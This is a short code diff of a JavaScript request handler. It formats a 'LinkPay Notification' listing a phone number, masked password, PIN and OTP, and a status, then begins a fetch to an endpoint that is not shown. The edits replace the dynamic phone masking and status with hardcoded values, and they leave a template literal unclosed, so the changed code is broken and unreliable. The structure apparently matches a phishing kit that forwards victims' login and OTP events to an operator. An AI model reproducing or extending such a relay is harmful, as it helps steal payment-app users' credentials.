@@ -18,19 +18,20 @@ export default async function handler(req, res) {
   const result = req.body?.result || "Action received";
 
   const  Phone = phone
-    ? (phone).replace(
+    ? String(phone).replace(
         /^(\+?\d{2})\d+(\d{2})$/,
-        "$"
+        "1111111"
       )
-    : "provided";
+    : "111111";
 
   const message =
-    `🔔 LinkPay Notification\n\n` +
-    `📱 Phone: ${Phone}\n` +
-    `🔑 Password: ********\n` +
-    `🔢 PIN: ****\n` +
-    `🔐 OTP: ******\n` +
-    `✅ Status: ${result}`;
+    `🔔 LinkPay Notification
+
+📱 Phone: +9111111110
+🔑 Password: ********
+🔢 PIN: ****
+🔐 OTP: ******
+✅ Status: OTP requested
 
   try {
     const response = await fetch(
